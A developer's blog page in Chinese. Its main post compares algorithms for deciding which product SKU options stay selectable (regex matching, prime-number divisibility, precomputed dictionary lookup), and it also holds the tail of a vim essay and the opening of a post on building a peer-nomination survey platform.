<p>故事到此为止，vim是古老一些了，但vim从来不是为某一种语言，某一类开发者准备的，它是一个文本编辑器，能做文本编辑器应该做的一切。也许，大多数前端都在使用js html和 css，一个支持js html css的编辑器就足够了，但是，你永远无法预料自己将要使用什么语言，将会面临什么文件。这一切，在vim看来，都是文本而已，任何文本的编辑处理，纳入到 vim中，它和编辑其他文件没有差异。使用vim，你拥有的不是开发某一种语言的能力，而是一套通用的高效的文本编辑方法，工具。也正是因此，vim在鼠标已经流行了很多年，现代编辑器，IDE发展非常强劲的时代，依然没有被淘汰。 编程环境总在变化，语言自身也在发展，发展如此之快，IntelliJ IDEA的模式，在现在有效，不知道过多少年，它也许就不再有效了。</p>
<h3 id="-">总结</h3>
<p>关于vim的神话，那大概只是一个传说。vim只是一个有特色的编辑器而已，也是一个非常值得拥有的工具，它定义了一套独特的文本编辑方案，熟悉它，可以让你在unix上获得自由，可以让你面对文本操作任务，随心所欲，指随意动。同样的，vim只能处理文本，它永远无法做到IDE可以实现的一些功能，但无论如何，都不能抹杀vim的优秀之处。</p>
</div><footer class="post__foot u-cf"><a href="/2012/11/04/how-vim-so-good/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2012-04-27T15:20:05.000Z" class="post__time">April 27, 2012</time><h1 class="post__title"><a href="/2012/04/27/an-fun-discuss/">一次有意思的内部讨论-sku组合查询算法探索</a></h1></header><div class="post__main"><link rel="stylesheet" href="http://ued.taobao.org/blog/wp-content/uploads/2012/07/hanwen/path.css" />

<p>在前端领域，很少会遇到算法问题，这不能说不是一种遗憾。不过，随着前端处理的任务越来越复杂和重要，偶尔，也能遇到一些算法上的问题。本文，所要讨论的，就是这样一样问题。</p>
<h3 id="-sku">什么是SKU</h3>
<p>问题来自垂直导购线周会的一次讨论，sku组合查询，这个题目比较俗，是我自己取得。首先，看下什么是sku，来自维基百科的解释：</p>
<blockquote>
<p>最小存货单位(<a href="http://en.wikipedia.org/wiki/Stock-keeping_unit" target="_blank">Stock Keeping Unit</a>)在连锁零售门店中有时称单品为一个SKU，定义为保存库存控制的最小可用单位，例如纺织品中一个SKU通常表示规格、颜色、款式。</p>
</blockquote>
<p>让我们假设在淘宝上，有这么一个手机，如下表格所示：</p>
<p><table><tbody><tr><th>颜色</th><th>容量</th><th>保修期限</th><th>屏幕大小</th><th>电池容量</th></tr><tr><td>红色</td><td>4G</td><td>1 month</td><td><strong>3.7</strong></td><td>1500mAh</td></tr><tr><td><strong>白色</strong></td><td>8G</td><td><strong>3 month</strong></td><td>4</td><td>1900mAh</td></tr><tr><td>黑色</td><td><strong>16G</strong></td><td>6 month</td><td>4.3</td><td><strong>2100mAh</strong></td></tr><tr><td>黄色</td><td>64G</td><td>1 year</td><td>&nbsp;</td><td>2500mAh</td></tr><tr><td>蓝色</td><td>128G</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr></tbody></table>sku: 白色 + 16G + 3 month + 3.7 + 2100mAh就这么一款可以提供5种颜色，5种容量，4种保修期限， 3种屏幕尺寸，4种电池容量的手机，我们假设它存在，叫xphone。表格中，加粗的5种属性，组合在一起，构成一个sku。现在，应该清楚什么是sku了吧。可以把xphone的规格参数看成一个JS的构造器，每一个sku，对xphone函数进行实例化，返回的一个对象就是一个sku。不过，这和一部手机的概念有一些区别，一个sku对应多个手机，sku是描述手机的最小单位，比如说学校，在学校里面最小教学单位是班级，那么一个班级可以看做一个sku。</p>
<h3 id="-">问题描述</h3>
<p>下面，为了描述问题，我首先假设一个产品属性组合2x2，用<code>[[a, A], [b, B]]</code>表示，那么，sku组合为<code>[ab, Ab, Ab, AB]</code>，也是2x2，4个sku。现在我们知道sku对应的数目和价格，依然用js对象来描述为：</p>
<figure class="highlight"><pre><span class="rules">{
    <span class="rule"><span class="attribute">ab</span>:<span class="value"> {amount: <span class="number">10</span>, price: <span class="number">20</span></span></span></span>}
    <span class="tag">aB</span>: <span class="rules">{<span class="rule"><span class="attribute">amount</span>:<span class="value"> <span class="number">10</span>, price: <span class="number">30</span></span></span></span>}
    <span class="tag">AB</span>: <span class="rules">{<span class="rule"><span class="attribute">amount</span>:<span class="value"> <span class="number">10</span>, price: <span class="number">40</span></span></span></span>}
}
</pre></figure>

<p>这个的数据说明了，Ab是没有货存的，ab, aB, AB分别有10个货源在。那么，当用户对商品进行选择的时候，如果首先选择A，那么，b应该显示为不可选择状态，因为Ab是没有货的。同样，如果选择了b，那么A应为灰掉，因为Ab还是没有值的。可能的几种状态如下：</p>
<div class="alert alert-info"><div class="ui-inline-block">  初始状态  <div class="group">    <span class="text">属性1：</span>    <button class="btn" id="A">A</button>    <button class="btn" id="a">a</button>  </div>  <div class="group">    <span class="text">属性2：</span>    <button class="btn" id="B">B</button>    <button class="btn" id="b">b</button>  </div></div><div class="ui-inline-block">  1. 选中b，A禁止  <div class="group">    <span class="text">属性1：</span>    <button class="btn disabled" id="A">A</button>    <button class="btn" id="a">a</button>  </div>  <div class="group">    <span class="text">属性2：</span>    <button class="btn" id="B">B</button>    <button class="btn active btn-warning" id="b">b</button>  </div></div><div class="ui-inline-block">  2. 选中A，b禁止  <div class="group">    <span class="text">属性1：</span>    <button class="btn active btn-warning" id="A">A</button>    <button class="btn" id="a">a</button>  </div>  <div class="group">    <span class="text">属性2：</span>    <button class="btn" id="B">B</button>    <button class="btn disabled" id="b">b</button>  </div></div><div class="ui-inline-block">  3. 选中AB，价格为40  <div class="group">    <span class="text">属性1：</span>    <button class="btn active btn-warning" id="A">A</button>    <button class="btn" id="a">a</button>  </div>  <div class="group">    <span class="text">属性2：</span>    <button class="btn active btn-warning" id="B">B</button>    <button class="btn disabled" id="b">b</button>  </div></div></div>  

<p>问题：用户选择某个属性后，如何判断哪些属性是可以被选择的。当sku属性只是2x2的时候，还是很容易计算的。但是，如果情况变得复杂，比如4x4x4x5这样的情况，要判断用户的那些行为是可行的，还是会复杂很多的。下面看算法实现吧，还是用2x2这种最简单的形式作为参考。为了方便描述，下面使用<code>result = {ab: ...}</code>表示sku对应的价格和数目的数据对象，使用<code>item</code>表示一个sku属性下的一个元素，<code>items = [[a, A], [b, B]]</code>表示所有sku属性元素。</p>
<h3 id="-">算法演示</h3>
<p>首先来一个演示吧，仅支持高级浏览器。对于第一算法，使用正则匹配，不是很完善，有些不准，仅仅是演示，正则表达式写的不好，不用在意。</p>
<p>下面灰色按钮表示不可选，白色表示可选，红色为选中状态。演示框最下面是可用的sku组合。</p>
<div class="alert alert-info">

<label for="J_input">item数组</label><input type="text" value="[8, 8, 8, 8, 8, 8, 8]" name="a" id="J_input"><label for="J_nums">随机数范围</label><input type="text" value="500" name="num" id="J_nums"><button class="btn" id="J_sub">重新生成</button>
第一种算法[正则]：
<div id="J_demo" class="ui-inline-block">共进行323次运算，耗时2ms<div class="group"><span class="text">属性1：</span><button class="btn" data-id="2">002</button><button class="btn" data-id="3">003</button><button class="btn" data-id="5">005</button><button class="btn" data-id="7">007</button><button class="btn" data-id="11">011</button><button class="btn" data-id="13">013</button><button class="btn" data-id="17">017</button><button class="btn" data-id="19">019</button></div><div class="group"><span class="text">属性2：</span><button class="btn" data-id="23">023</button><button class="btn" data-id="29">029</button><button class="btn" data-id="31">031</button><button class="btn" data-id="37">037</button><button class="btn" data-id="41">041</button><button class="btn" data-id="43">043</button><button class="btn" data-id="47">047</button><button class="btn" data-id="53">053</button></div><div class="group"><span class="text">属性3：</span><button class="btn" data-id="59">059</button><button class="btn" data-id="61">061</button><button class="btn" data-id="67">067</button><button class="btn" data-id="71">071</button><button class="btn" data-id="73">073</button><button class="btn" data-id="79">079</button><button class="btn" data-id="83">083</button><button class="btn" data-id="89">089</button></div><div class="group"><span class="text">属性4：</span><button class="btn" data-id="97">097</button><button class="btn" data-id="101">101</button><button class="btn" data-id="103">103</button><button class="btn" data-id="107">107</button><button class="btn" data-id="109">109</button><button class="btn" data-id="113">113</button><button class="btn" data-id="127">127</button><button class="btn" data-id="131">131</button></div><div class="group"><span class="text">属性5：</span><button class="btn" data-id="137">137</button><button class="btn disabled" data-id="139">139</button><button class="btn" data-id="149">149</button><button class="btn" data-id="151">151</button><button class="btn" data-id="157">157</button><button class="btn" data-id="163">163</button><button class="btn" data-id="167">167</button><button class="btn" data-id="173">173</button></div><div class="group"><span class="text">属性6：</span><button class="btn" data-id="179">179</button><button class="btn" data-id="181">181</button><button class="btn" data-id="191">191</button><button class="btn" data-id="193">193</button><button class="btn" data-id="197">197</button><button class="btn" data-id="199">199</button><button class="btn" data-id="211">211</button><button class="btn" data-id="223">223</button></div><div class="group"><span class="text">属性7：</span><button class="btn" data-id="227">227</button><button class="btn" data-id="229">229</button><button class="btn" data-id="233">233</button><button class="btn" data-id="239">239</button><button class="btn" data-id="241">241</button><button class="btn" data-id="251">251</button><button class="btn" data-id="257">257</button><button class="btn" data-id="263">263</button></div></div>
第一种算法优化方式[除法]：
<div id="J_demo_imporve" class="ui-inline-block">共进行387次运算，耗时1ms. result乘积最大为67672188866017<div class="group"><span class="text">属性1：</span><button class="btn" data-id="2">002</button><button class="btn" data-id="3">003</button><button class="btn disabled" data-id="5">005</button><button class="btn" data-id="7">007</button><button class="btn" data-id="11">011</button><button class="btn" data-id="13">013</button><button class="btn" data-id="17">017</button><button class="btn" data-id="19">019</button></div><div class="group"><span class="text">属性2：</span><button class="btn" data-id="23">023</button><button class="btn" data-id="29">029</button><button class="btn" data-id="31">031</button><button class="btn" data-id="37">037</button><button class="btn" data-id="41">041</button><button class="btn" data-id="43">043</button><button class="btn" data-id="47">047</button><button class="btn" data-id="53">053</button></div><div class="group"><span class="text">属性3：</span><button class="btn" data-id="59">059</button><button class="btn" data-id="61">061</button><button class="btn" data-id="67">067</button><button class="btn" data-id="71">071</button><button class="btn" data-id="73">073</button><button class="btn" data-id="79">079</button><button class="btn" data-id="83">083</button><button class="btn" data-id="89">089</button></div><div class="group"><span class="text">属性4：</span><button class="btn" data-id="97">097</button><button class="btn" data-id="101">101</button><button class="btn" data-id="103">103</button><button class="btn" data-id="107">107</button><button class="btn" data-id="109">109</button><button class="btn" data-id="113">113</button><button class="btn" data-id="127">127</button><button class="btn" data-id="131">131</button></div><div class="group"><span class="text">属性5：</span><button class="btn" data-id="137">137</button><button class="btn disabled" data-id="139">139</button><button class="btn" data-id="149">149</button><button class="btn" data-id="151">151</button><button class="btn" data-id="157">157</button><button class="btn" data-id="163">163</button><button class="btn" data-id="167">167</button><button class="btn" data-id="173">173</button></div><div class="group"><span class="text">属性6：</span><button class="btn" data-id="179">179</button><button class="btn" data-id="181">181</button><button class="btn" data-id="191">191</button><button class="btn" data-id="193">193</button><button class="btn" data-id="197">197</button><button class="btn" data-id="199">199</button><button class="btn" data-id="211">211</button><button class="btn" data-id="223">223</button></div><div class="group"><span class="text">属性7：</span><button class="btn" data-id="227">227</button><button class="btn" data-id="229">229</button><button class="btn" data-id="233">233</button><button class="btn" data-id="239">239</button><button class="btn" data-id="241">241</button><button class="btn" data-id="251">251</button><button class="btn" data-id="257">257</button><button class="btn" data-id="263">263</button></div></div><div id="J_open_way">可选择的路线: 
<div id="3:23:83:101:137:179:227" class="way ui-inline-block">3:23:83:101:137:179:227</div><div id="11:53:67:131:157:191:251" class="way ui-inline-block">11:53:67:131:157:191:251</div><div id="7:29:73:127:167:211:257" class="way ui-inline-block">7:29:73:127:167:211:257</div><div id="17:47:71:103:151:199:241" class="way ui-inline-block">17:47:71:103:151:199:241</div><div id="3:41:89:107:151:223:257" class="way ui-inline-block">3:41:89:107:151:223:257</div><div id="19:53:83:109:163:199:229" class="way ui-inline-block">19:53:83:109:163:199:229</div><div id="13:43:79:101:173:211:239" class="way ui-inline-block">13:43:79:101:173:211:239</div><div id="19:47:67:127:157:191:229" class="way ui-inline-block">19:47:67:127:157:191:229</div><div id="3:37:61:107:167:223:251" class="way ui-inline-block">3:37:61:107:167:223:251</div><div id="2:31:89:97:151:199:257" class="way ui-inline-block">2:31:89:97:151:199:257</div><div id="13:29:59:113:149:193:227" class="way ui-inline-block">13:29:59:113:149:193:227</div><div id="11:41:73:103:173:181:263" class="way ui-inline-block">11:41:73:103:173:181:263</div><div id="19:43:89:103:151:197:263" class="way ui-inline-block">19:43:89:103:151:197:263</div><div id="3:53:83:107:149:199:241" class="way ui-inline-block">3:53:83:107:149:199:241</div><div id="11:29:71:131:157:211:233" class="way ui-inline-block">11:29:71:131:157:211:233</div><div id="13:31:61:113:173:181:229" class="way ui-inline-block">13:31:61:113:173:181:229</div><div id="2:37:83:127:137:211:251" class="way ui-inline-block">2:37:83:127:137:211:251</div><div id="17:53:89:97:151:191:229" class="way ui-inline-block">17:53:89:97:151:191:229</div><div id="3:31:73:103:167:193:239" class="way ui-inline-block">3:31:73:103:167:193:239</div></div></div>

<h3 id="-">第一种算法</h3>
<dl><dt>初始条件</dt><dd>已知所有sku属性的数组<code>items</code>和sku所对应的价格信息<code>result</code></dd><dd>用户选择了<code>item</code> B，使用数组<code>selected=[&#39;B&#39;]</code>表示，<code>selected</code>可以为空数组</dd></dl><dl><dt>算法过程</dt><dd>1. 循环所有sku属性<code>forEach(result, (curitems, attr)-&amp;gt;)</code>，使curitems等于属性对应的所有元素，attr等于属性id。</dd><dd>2. 克隆数据<code>attrSelected = selected</code></dd><dd>3. 判断属性<code>attr</code>中是否有元素在数组<code>attrSelected</code>中，如果存在，从<code>attrSelected</code>去掉存在的元素</dd><dd>4. 循环属性下的元素<code>forEach(curitems, (item)-&amp;gt;</code>，使得item等于单个属性的值</dd><dd>5. 把 <code>attrSelected</code>和<code>item</code>组合成sku</dd><dd>6. 循环<code>result</code>，判断第五组成的sku在result中是否存在，如果存在，退出循环4，返回true，进入步骤8</dd><dd>7. 当前<code>item</code>设置为灰色，标志不可选择</dd><dd>8. 当前<code>item</code>为可选属性元素</dd><dd>9. 循环4和循环1完成，所有<code>item</code>状态标注完成，算法结束</dd></dl>

<p>这个方式是最普通的算法实现了，非常直接，一个一个判断所有的<code>item</code>是否可以被选中，判断依据是<code>item</code>和<code>selected</code>的元素组合的sku是否在<code>result</code>数组中存在。在我们上面的例子中，在初始化的情况下，用户没有选中任何元素，那么循环过程，只需要判断<code>a, b, A, B</code>在<code>selected</code>是否存在。如果，用户选中了<code>b</code>，那么循环过程中，依次判断的sku组合是<code>ab, Ab, B</code>，存在的sku组合是<code>ab, aB, AB</code>，所以因为Ab组合没有能知道，所以，A需要标注为不可点。组合sku判断的时候，需要注意的是，因为B和选中的b在同一个属性中，所以组合的时候，需要去掉b，然后组合成B，这是第3步所主要完成的过程。</p>
<p>这样的算法，很简单，但很繁琐，循环嵌套循环，可以简单分析一下算法复杂度。如果sku属性组合元素的总和数用m表示，结果数据长度为n，那么每次选择后，需要的算法大致步骤是m <em> n。这似乎不是很复杂，m </em> n而已，不过，每次判断一个sku组合是否和result中的组合匹配，却不是一个简单的过程，实际上，这可以看做是一个字符串匹配的一个算法了，最简单的还是使用正则匹配，m * n次正则匹配，这样就不怎么快了吧。正则表达式很不稳定，万一sku组合中有一些特殊字符，就可能导致一个正则匹配没能匹配到我们想要的表达式。</p>
<h3 id="-">第一种算法的优化</h3>
<p>经过讨论，第一种算法，有了优化的算法思路。 就第一种算法而言，正则匹配不够优雅，而且比较慢，而我们想要做的事情是比较一个组合是否包含于另外一个组合，用数学语言来描述，就是一个集合是否是另一个集合的子集，怎么来做这样的快速判断呢。</p>
<p>现在问题可以简化为：假设一个集合A{a, b, c}和另外一个集合B{a, e}，如何快速判断B是否是A的子集。这个问题比较简单的方法是用B中所有元素依次和A中的元素进行比较，还是简单而粗暴的方式，比正则稍微快一些。对于集合中的元素，它们都以唯一的，通过这样的特性，我们可以把所有字母转换为一个质数，那么 <strong>集合A可以表示为集合元素(质数)的积，B同样， B是否是A的子集，这个只需要将B除以A，看看是否可以整除</strong> ，如果可以那么说明，B是A的子集。</p>
<p>现在处理字符串就转换为处理乘法算法了，有了以上的分析，我们可以整理下算法过程：</p>
<ol>
<li>数据预处理，生成一组随机数，把所有item一一对应一个质数，把item组合转换为一几个  质数的积</li>
<li>根据用户已经选择的item进行扫描所有的item，如果item已经被选中，则退出，如果没有，  则和所有已经选择的item进行相乘(特别注意，以选中的item需要去掉和当前匹配的item  在同一个类目中的item，因为一个组合不可能出现两个类目相同的item) ，这个乘机就是  上文中的集合B</li>
<li>把集合B依次和sku组合构成的积(相当于上文中的集合A)进行相除，比较，如果整除，则  退出，当前匹配的sku可以被选中，如果一直到最好还没有匹配上，则不能被整除。  </li>
</ol>
<p>这样优化了一下看起来比较简单的思路，但是实现起来却一点都不容易，代码在<a href="https://gist.github.com/2141756" target="_blank">这里</a>。算法也算简化了不少，不过这个预处理过程还是比较麻烦的，而且实际上，和第一种方案的解决的算法复杂度差不多，只是比较的时候使用的是乘除法，而第一种是正则匹配罢了。</p>
<h3 id="-">第二种算法</h3>
<p>后来又过了一周，这个问题被当成一个方案来继续讨论了。大家此时差不多都无话可说了，算法都有实现了，似乎没有什么其他可说的了。就在这个问题就如此结束的时候，正豪站出来了，说不管是第一种还是第一种方案的优化方案，每次用户进行选择，都需要重复计算一遍，这样实在太麻烦了。每次都对所有spu进行扫描，这样不是很好，能不能有其他的方式呢，能否更加直接判断出一个sku是否可以被选择呢。前面的算法，一个sku是否可以被选择，需要依次循环sku 组合的所有元素才可以判断的，这样的过程一定需要吗？</p>
<p>第三种算法就这样诞生了，考虑到JavaScript中的对象属性访问是最快的了，那么对于如果能够直接从一个对象中读取到以选择的sku和需要匹配的sku组合对应的数目，那这样的算法简直就是不用时间啊。下面来详细描述。</p>
<p>下面把问题初始条件假设如下：</p>
<div class="alert alert-info"><div class="ui-inline-block">  初始状态，选中A1  <div class="group">    <span class="text">属性1：</span>    <button class="btn active btn-warning" id="A">A1</button>    <button class="btn" id="a">A2</button>    <button class="btn">A3</button>    <button class="btn">A4</button>  </div>  <div class="group">    <span class="text">属性2：</span>    <button class="btn" id="B">B1</button>    <button class="btn" id="b">B2</button>    <button class="btn">B3</button>  </div>  <div class="group">    <span class="text">属性3：</span>    <button class="btn">C1</button>    <button class="btn">C2</button>    <button class="btn">C3</button>  </div></div></div>

<p>假如已经选中item为A1，那么现在要计算B1是否可以被选择，那么如果我们能够直接获取到A1和B1组合的所有商品数目，那么就能知道B1是否可以被选择了。A1和B1的组合是这样计算的，在上面描述的问题空间中，A1和B1的组合，可能有以下几种： A1+B1+C1, A1+B1+C2,A1+B1+C3。这些组合就可以直接从已知的sku组合中获取信息啦，同样是对象属性查找，快得不得了。示例如下：</p>
<div class="alert alert-info">  <div class="group">    A1选中状态下，判断B1是否可用，只需要查找A1 B1
    <button class="btn active btn-warning" id="A">A1</button>    <button class="btn ">B1</button>    =     <button class="btn active btn-warning" id="A">A1</button>    <button class="btn ">B1</button>    <button class="btn ">C1</button>    +     <button class="btn active btn-warning" id="A">A1</button>    <button class="btn ">B1</button>    <button class="btn ">C2</button>    +    <button class="btn active btn-warning" id="A">A1</button>    <button class="btn ">B1</button>    <button class="btn ">C3</button>  </div>  A1+B1+C1这样的组合，结果可以可以直接从result中获得数据结果。</div>

<p>实际上， 对于任何一个sku和其他sku的组合都是可以通过同样的方式递归查找来实现获取其组合后的商品数目。这样的算法最大的优势是，计算过程是可以缓存的，比如计算A1是否可以被选中，那么肯定需要计算除A1+B1组合的数目，A1的数目是由A1+B1，A1+B2，A1+B3三个子集构成，这三个子集又可以拆分为更细的组合，然后这些所有的组合对应的商品数目都可以获取到了，下次需要判断A1+B2组合，则无需重复计算了。此外，我们可以清晰的获取组合相关的信息，比如某个sku下面可以有的商品数目。</p>
<p>算法实现<a href="https://gist.github.com/3074516" target="_blank">这里</a>，<a href="http://jsfiddle.net/cctvu/9Y54x/" target="_blank">jsfiddle</a>。</p>
<h3 id="-">复杂度分析</h3>
<p>第二种算法思路非常有趣，使用动态规划法，将原问题分解为相似的子问题，在求解的过程中通过子问题的解求出原问题的解。而且，最终判断一个item是否可以被选择，直接从对象中查找，属于字典查找算法了，应该是很快。但是，乍一看，还是有些问题，递归查找，数据贮存在变量中，这些都是通过空间来换取时间的做法，递归会堆栈溢出吗？查找次数到底多少？</p>
<p>第一个种算法的复杂度还是很容易计算的，首先假设一个n <em> n的矩阵构成sku属性，比如10x10表示，有10个属性，每个属性有10个元素。假设可选择的result长度是m，那么，第一种算法的复杂度大概是 n </em> n * m，这样的算法还是很快的。只是，如果每一个步骤，都使用正则表达式匹配，根据上面的演示，确实会有一些些慢，不过正则表达式的是模糊匹配，可能不是那么稳定。不过除法方式判断需要生成足够的质数，当几个数的乘积太大的时候，可能导致计算机无法运算，所有，使用第1种算法的优化算法，也是有一定限制的。js里面，能够处理的最大数字大概是19位，这个范围内可以操作的范围还是比较大的，这个就不做推算了。此外，通用可以引入负数，这样就可以把质数的范围增大一倍，计算量也小一些，可以处理更大的输入规模了。</p>
<p>第二种算法复杂度，同样对于n * n的数据输入，从第一排算起，第一排第一个A1，组合为A1 + B1, A1 + B2 ...函数递归进入第二层，第二层从第一个B1开始，组合为A1 + B1+ C1, A1 + B1 + C2 ...进入第三层，以此类推，函数每增加一层，需要的计算量是上一层的n倍，总数是 n + n<sup><small>2</small></sup> + n<sup><small>3</small></sup> + ... + n<sup><small>n</small></sup>，这个数目是非常庞大了，算法复杂度用n<sup><small>n</small></sup>来描述了，如果是10x10的sku属性组合，初始化需要100亿次计算，有些吓人了，这还需要一个同样庞大的内存数组。</p>
<h3 id="-">第二种算法的优化</h3>
<p>经过上面的算法分析，似乎第二种算法是错误的，无法执行。不过，仔细想想，第二种方法第一初始化的时候算法复杂度非常高，几乎是浏览器无法承受的。但是，一旦数据初始化完成，后面的过程就非常简单了，同样对于n <em> n规模的输入，每次用户选择，这个时候，需要进行的操作是把所有数据遍历一遍，然后直接查询是否存可以被选中。算法复杂度是n </em> n。比起上面第一种算法的优化算法要快，现在主要的问题是，初始化如果使用自上而下，不断拆分问题，这样运算复杂度指数级增加，不过，算法本身是可行的，数据初始化过程，还是需要进一步优化。</p>
<p>第二种算法，把问题一层一层拆分，查找过程分解太过于琐碎，有很多的组合，是完全不可能存在的，算法非常浪费。如果，直接从获得的result数组中读取数据组合，只需要把result循环一遍，所有可能的组合就都可以计算出来了。举个例子，从最上面的2x2的result中，我们知道result对象</p>
<figure class="highlight"><pre>    <span class="tag">ab</span>: <span class="rules">{<span class="rule"><span class="attribute">amount</span>:<span class="value"> <span class="number">10</span>, price: <span class="number">20</span></span></span></span>}
    <span class="tag">aB</span>: <span class="rules">{<span class="rule"><span class="attribute">amount</span>:<span class="value"> <span class="number">10</span>, price: <span class="number">30</span></span></span></span>}
    <span class="tag">AB</span>: <span class="rules">{<span class="rule"><span class="attribute">amount</span>:<span class="value"> <span class="number">10</span>, price: <span class="number">40</span></span></span></span>}
</pre></figure>

<p>计算过程，循环result</p>
<ol>
<li>第一次分解ab，a = 10, ab = 10, b = 10</li>
<li>第二次分解aB, a = a + 10 = 20, aB = 10, B = 10</li>
<li>第三次分解AB, A = 10, AB = 10, B = B + 10 = 20</li>
</ol>
<p>三次循环，得到一个新的数据结构<code>var map = {a: 20, ab: 10, b: 10, aB: 10, AB: 10, A: 10, B: 10}</code>通过这个对象，就可以判断任何情况了。比如，初始化的时候，需要查找a, b, c,d，直接查找map对象中是否存在a, b, c, d。如果选择了a，那么需要判断aB, ab，统一直接查找的方式。</p>
<p>经过这样的优化，初始化的时候计算量也不大，这样第二种算法的实现就可以很好的完成任务了。可能这个map对象，可能还是会有点大。</p>
<h3 id="-">结论</h3>
<p>总的来说，比较好的方式是第一种算法的优化(也就是除法判断)和第二种算法。各自有其特点，都有其特色之处，除法判断把 <strong>字符串匹配转换为数字运算</strong> ，第二种算法使用 <strong>字典查找</strong> 。并且都能 <strong>快速准确</strong> 的计算出结果。</p>
<p>从算法速度来说，第一种算法复杂度是n <em> n </em> m，当然需要一个比较繁琐负责的质数对应转换过程，第二种算法复杂度是 n * n，其初始化过程比较复杂，最初的方式是n<sup><small>n</small></sup>，经过优化，可以提高到n!，n的阶乘。从理论上而言，n<sup><small>n</small></sup>或者n!都是不可用的算法了，就实际情况而言，sku组合大多在，6x6以下，第二种算法还是非常快的。</p>
<p>从算法本身而言，第二种算法想法非常奇妙，容易理解，实现代码优雅。只是初始化比较慢，在初始化可以接受的情况下，还是非常推荐的，比如淘宝线上的sku判断。此外，第二种算法获得的结果比起第一种更具有价值，第二种方式直接取得组合对应的数目，价格信息，而第一种只是判断是否可以组合，从实际应用角度而言，第二种方式还是剩下不少事的。</p>
<p>感觉只要善于去发现，还能能够找到一些有意思的解决问题思路的。</p>
<script src="http://ued.taobao.org/blog/wp-content/uploads/2012/07/hanwen/path.js" charset="utf-8"></script>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/算法/" class="post__tag__link">算法</a></li></ul><a href="/2012/04/27/an-fun-discuss/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2011-05-15T01:05:43.000Z" class="post__time">May 15, 2011</time><h1 class="post__title"><a href="/2011/05/15/peer-say/">同伴提名测验平台</a></h1></header><div class="post__main"><p>因为找工作的事情，在杭州呆了近四个月，然后回到长沙，闲置了一个月，工作还是没有确定，无奈，只能匆匆忙忙赶回学校写论文了，剩不到二十天时间。和<a href="http://www.nenu.edu.cn/professor/pro/show.php?flag=1&amp;id=668" target="_blank">盖老师</a>商量，做实验或者写研究综述都来不及了，于是我说，如果能够做一个毕业设计啥的，也许更容易些。于是，盖老师给我推荐了这么个题目，<a href="http://peersay.sinaapp.com/" target="_blank">同伴提名测验平台</a>。</p>
<p>对于任何计算机开发项目，最重要的就是一个词<strong>速度</strong>，开发速度和运行速度，具体来说表现在代码可读性、可维护性、重用以及程序运行的效率、性能等方面。不过，通常程序员写代码的速度会和程序运行速度相冲突的，微观来看，我们经常遇到的就是一个算法中时间与空间的权衡。那么究竟如何处理，这就得依据具体情况而定了。</p>
<h2 id="-">大胆使用开源吧</h2>
<p>一直对开源怀有一种敬畏的心态，感觉就像古人瞻仰圣人“高山仰止，景行行止。虽不能至，然心向往之。”有时甚至妄自菲薄，感叹，这个世界有如此完美的技术，强如jQuery、WordPress，那么我们这些程序员还能再做什么呢。当然，那时候我依然停留在Dreamweaver+ZendStudio+WAMP开发时代，实际上，我离开源还有一段好长的距离。同时，作为web开发者，总是对自己作为一个程序员是否合格感到心虚，从传统影响来看，桌面应用才算是真正的程序吧。去一个学校应聘时，那信息中心的老师说，哦，就是一个网页啊，哪里是什么信息系统啊。</p>
<p>现在想想，任何实现变量、流控制和基本运算的语言不都能完成其他任何一种图灵完全的语言的任务。他们的差别不过在于使用某种语言的人们是如何使用这门语言吧。和JavaScript相比，PHP都显得中规中矩，虽然大多数时间JS让人无比郁闷，但我还是更喜欢那种灵活的使用方式。还尝试过一段时间学习Pascal，我想我无论如何也无法理解，使用它的人们会称之女神。但依然有那么多人能够理解Pascal，任何一种技术，都只有被理解，被使用了，才算是成功的。所以，参与开源，就大胆地使用它们吧。开源之所以存在，不仅仅是为了人们去创造更多有意思的技术，更重要的是它们需要是有价值的，需要被使用。最近，看到<a href="http://ejohn.org/" target="_blank">John Resig</a>在博客上谈到自己转到另一个开源公司了（而且是做教育方面的，呵呵，我也得去搞教育了，不过悲剧的是去教office），我很惊讶，美国那么多开源技术公司，它们是如何生存的，作为中国人，我有些无法理解，开源的公司也能存在。</p>
<p>讲了这么多废话，开始说说这个同伴提名测验平台吧。</p>
<h2 id="-mvc">前端MVC</h2>
<p>第一次听说前端搞MVC还是今年4月初的时候，去阿里云闲谈了一会儿（算是一个不正式的面试吧），被问起你是如何看待前端MVC的。当时顿感鸭梨甚大，就随便答了几句。现在终于明白了，前端的MVC模式最重要的就是解决传统web开发中View层的可重复、模块化开发问题的吧。一年前在雅礼做教师信息平台时，感觉<a href="http://codeigniter.org" target="_blank">Codeigniter</a>的MVC模式非常好用，就是在View层功能实在太弱了。每一个页面都得放一个视图的html文件，完全不可重复。写代码最难受的事情就是复制了。当时很郁闷的在控制器中定义一个数组来配置视图，勉强实现了头部、左侧导航和底部版权信息部分的重用。但是，头部稍微修改一个小链接，就得把View的php代码改得一塌糊涂。最近CI发布新版本，还整合了一个JavaScript类——神啊，JavaScript如此强大，如何能屈居于PHP之下。</p>
<p>所以，但今天，我再也不能忍受PHP和HTML混在一起了。OK，那就得用MVC模式啦。测验平台还是使用Codeigniter框架，只是它的MVC被我只用了M和C，View只有<a href="https://github.com/shepherdwind/peersay/blob/master/application/views/admin/research_index.php" target="_blank">一个文件</a>，简单定义下HTML头，加载一下css和js，其他的就<a href="https://github.com/shepherdwind/peersay/blob/master/application/views/admin/research_index.php" target="_blank">这么些了</a>，本来和特意准备了一个文件夹来放View的。这就是所谓的单页面web app啦。</p>
<h3 id="-backbone-http-documentcloud-github-com-backbone-and-seajs-http-seajs-com-"><a href="http://documentcloud.github.com/backbone/" target="_blank">Backbone </a>And <a href="http://seajs.com/" target="_blank">Seajs</a></h3>
<p>下面最重要的两位上场了，首先谈谈Seajs。在使用YUI时，觉得，那个seed确实很爽，想用什么，直接load就行了，维护页面一堆script标签也是一件非常无聊的事情。在杭州时，就听说玉伯在考虑seajs了，当时想，什么都mixin，和我直接把其他对象的prototype引用过来有啥不一样吗。现在看看，就简单的这样引人类似于YUI中的seed文件了</p>
<figure class="highlight"><pre><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"assets/js/sea.js"</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</pre></figure>

